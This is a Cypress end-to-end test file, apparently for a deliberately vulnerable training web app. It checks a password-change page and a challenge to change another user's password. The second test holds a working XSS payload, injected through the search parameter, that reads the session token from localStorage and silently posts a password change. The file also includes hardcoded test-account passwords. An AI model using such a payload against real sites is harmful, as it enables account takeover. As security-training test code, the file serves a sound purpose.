describe('/#/privacy-security/change-password', () => {
  describe('as Morty', () => {
    beforeEach(() => {
      cy.login({
        email: 'morty',
        password: 'focusOnScienceMorty!focusOnScience'
      })
      cy.visit('/#/privacy-security/change-password')
    })

    it('should be able to change password', () => {
      cy.get('#currentPassword').focus().type('focusOnScienceMorty!focusOnScience')
      cy.get('#newPassword').focus().type('GonorrheaCantSeeUs!')
      cy.get('#newPasswordRepeat').focus().type('GonorrheaCantSeeUs!')
      cy.get('#changeButton').click()

      cy.get('.confirmation').should('not.be.hidden')
    })
  })

  describe('challenge "changePasswordBenderChallenge"', () => {
    it('should be able to change password via XSS-powered attack on password change without passing current password', () => {
      cy.login({
        email: 'bender',
        password: 'OhG0dPlease1nsertLiquor!'
      })
      const payload = '<iframe src="javascript:xmlhttp = new XMLHttpRequest(); xmlhttp.open(\'POST\', \'http://localhost:3000/rest/user/change-password\'); xmlhttp.setRequestHeader(\'Content-Type\', \'application/json\'); xmlhttp.setRequestHeader(\'Authorization\',`Bearer=${localStorage.getItem(\'token\')}`); xmlhttp.send(JSON.stringify({ new: \'slurmCl4ssic\', repeat: \'slurmCl4ssic\' }));">'
      cy.visit('/#/search?q=' + encodeURIComponent(payload))
      cy.wait(2000)
      cy.login({ email: 'bender', password: 'slurmCl4ssic' })
      cy.url().should('match', /\/search/)

      cy.expectChallengeSolved({ challenge: "Change Bender's Password" })
    })
  })
})
